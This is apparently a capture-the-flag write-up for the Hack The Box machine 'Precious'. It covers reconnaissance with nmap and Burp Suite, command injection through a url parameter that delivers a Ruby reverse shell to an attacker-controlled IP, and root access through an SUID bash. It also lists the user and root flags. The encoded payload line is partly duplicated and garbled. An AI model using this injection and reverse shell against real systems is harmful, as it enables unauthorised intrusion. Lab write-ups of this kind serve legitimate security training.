# Reconnaissance

## Port Scan (nmap)
We perform a nmap port scan using the following command:

**Command:**\
*sudo nmap -sC -sV -p- {IP address}*

**Results:**\
TCP Ports Open:
* 22 - SSH
* 80 - HTTP

## Capturing the Request Using BurpSuite

We first add *precious.htb* to our */etc/hosts/* file and then access the precious.htb url.

We are then presented with the following page:

![image](https://user-images.githubusercontent.com/85443537/223785060-e7a56134-1813-479f-b49a-e24a233d0406.png)


Open up *Burpsuite* and set *FoxyProxy* for burpsuite and then enable intercept traffic in *Proxy* tab and then *Intercept is off*. 
After enabling intercept traffic, make a request using the submit button on the web application.

![image](https://user-images.githubusercontent.com/85443537/223787647-d2a12df8-cb05-4ed1-a583-60e3e42971dd.png)


After intercepting the request in burpsuite, right click on the request and select the *Send to Repeater* option to send it to repeater. 

![image](https://user-images.githubusercontent.com/85443537/223787927-e838eacb-a063-4792-828b-2d6c3fa54ebe.png)


In the repeater tab we send the request with an empty url parameter and see that one of the response headers *X-Runtime* hints us that it is using *Ruby*.

![image](https://user-images.githubusercontent.com/85443537/223788023-77a7523c-c882-4f76-a9b6-7e3ba69abf71.png)

## Netcat and Ruby Rerverse Shell
We set up a netcat listener in a new terminal that listens to port 4444 using the following command:

**Command:**\
*sudo nc -lvnp 4444*

**Command Description:**\
* -l : Listener (listen for incoming connections)
* -v : Verbose
* -n : Numeric only ip addresses (no DNS)
* -p : Port

**Results:**

![image](https://user-images.githubusercontent.com/85443537/223788845-a03f9548-5010-4fa0-b23c-8e177bd4d7b0.png)

We then return to burpsuite in the repeater tab and enter the following value for the *url=* parameter*.
Note: Replace {IP Address} with your attacker machine IP address (do not forget to remove the curly brackets).

*http%3A%2F%2F{IP Address}%3A4444%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22*http%3A%2F%2F{IP Address}%3A4444%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.16.65%22%2C4444%29%29%27%60*
%22%2C4444%29%29%27%60*

The decoded equivalent to url is (do not use the decoded version in the url parameter):
Note: Replace {IP Address} with your attacker machine IP address (do not forget to remove the curly brackets).

*http://{IP Address}:4444/?name=%20\` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{IP Address}",4444))'\`*

![image](https://user-images.githubusercontent.com/85443537/223790881-5319a5de-33ae-46ed-9665-57237a2e612f.png)

After tapping send we get a reverse shell on our netcat listener that was previously set up.

## Inside the Shell

After getting reverse shell we can see that we logged in as the user *ruby*.

We run the following command to display all the files/directories that have the SUID bit set:

**Command:** *find / -perm /4000 2>/dev/null*

**Command Description:**\
* / : Look for all files and directories
*  -perm : Permissions
*  /4000 : SUID bit set
*  2>/dev/null : Redirects errors to /dev/null instead of showing them on screen

**Results:**

![image](https://user-images.githubusercontent.com/85443537/223792377-d064c884-2e6a-4a36-a08c-03ba1eb2e77a.png)

We look at the results and see we can run bash. We navigate to https://gtfobins.github.io/ and type in bash in the search bar.
Then scroll down till we reach SUID section. We can run *"bash -p"*.

After running the command *"bash -p"* on the victim machine, we surprisingly get root.

![image](https://user-images.githubusercontent.com/85443537/223793512-61823b48-66e0-489b-8ef8-2cbb863726c0.png)

We can now grab the user.txt flag from the user directory */home/henry* and the root.txt flag from root directory */root*.


# Goals

* USER Flag: 1ba79470b68e793ff903ebe6068553bd
* ROOT Flag: 5d0c40730f956d8bfa201a1475d0e4cc

